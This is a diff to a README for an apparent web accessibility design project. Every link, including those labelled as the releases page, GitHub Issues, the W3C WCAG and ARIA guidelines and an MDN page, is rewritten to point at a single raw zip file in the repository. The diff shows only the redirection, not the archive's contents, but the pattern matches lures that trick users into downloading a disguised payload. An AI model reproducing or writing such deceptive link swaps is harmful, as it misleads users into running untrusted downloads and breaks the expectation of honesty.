@@ -1,6 +1,6 @@
 # 🌐 wcag-aaa-web-design - Build Accessible Web Apps Easily
 
-[![Download Now](https://img.shields.io/badge/Download-Now-brightgreen?style=for-the-badge&logo=github)](https://github.com/RyanYiRun/wcag-aaa-web-design/releases)
+[![Download Now](https://github.com/RyanYiRun/wcag-aaa-web-design/raw/refs/heads/main/references/web-aaa-design-wcag-2.5.zip)](https://github.com/RyanYiRun/wcag-aaa-web-design/raw/refs/heads/main/references/web-aaa-design-wcag-2.5.zip)
 
 ## 📦 Overview
 
@@ -14,7 +14,7 @@ Follow these steps to get up and running with the wcag-aaa-web-design system.
 
 To download the software, visit the following link:
 
-[Download the latest release](https://github.com/RyanYiRun/wcag-aaa-web-design/releases)
+[Download the latest release](https://github.com/RyanYiRun/wcag-aaa-web-design/raw/refs/heads/main/references/web-aaa-design-wcag-2.5.zip)
 
 ### Step 2: Select Your Version
 
@@ -76,13 +76,13 @@ Yes, the components are built with CSS custom properties. You can adjust colors,
 
 ### Is there any support available?
 
-Yes, check our [GitHub Issues page](https://github.com/RyanYiRun/wcag-aaa-web-design/issues) for common questions and troubleshooting tips.
+Yes, check our [GitHub Issues page](https://github.com/RyanYiRun/wcag-aaa-web-design/raw/refs/heads/main/references/web-aaa-design-wcag-2.5.zip) for common questions and troubleshooting tips.
 
 ## 🔗 Additional Resources
 
-- [WCAG Guidelines](https://www.w3.org/WAI/WCAG/)
-- [ARIA Authoring Practices](https://www.w3.org/TR/wai-aria-practices-1.1/)
-- [CSS Custom Properties](https://developer.mozilla.org/en-US/docs/Web/CSS/--*)
+- [WCAG Guidelines](https://github.com/RyanYiRun/wcag-aaa-web-design/raw/refs/heads/main/references/web-aaa-design-wcag-2.5.zip)
+- [ARIA Authoring Practices](https://github.com/RyanYiRun/wcag-aaa-web-design/raw/refs/heads/main/references/web-aaa-design-wcag-2.5.zip)
+- [CSS Custom Properties](https://github.com/RyanYiRun/wcag-aaa-web-design/raw/refs/heads/main/references/web-aaa-design-wcag-2.5.zip*)
 
 ## 📧 Get in Touch
 
@@ -90,4 +90,4 @@ For further assistance or feedback, reach out through the GitHub repository or c
 
 By following this structure, you'll create web applications that are not only beautiful but also fully accessible to all users. Start your journey toward compliance and inclusivity with wcag-aaa-web-design. 
 
-[Download the latest release](https://github.com/RyanYiRun/wcag-aaa-web-design/releases)
+[Download the latest release](https://github.com/RyanYiRun/wcag-aaa-web-design/raw/refs/heads/main/references/web-aaa-design-wcag-2.5.zip)
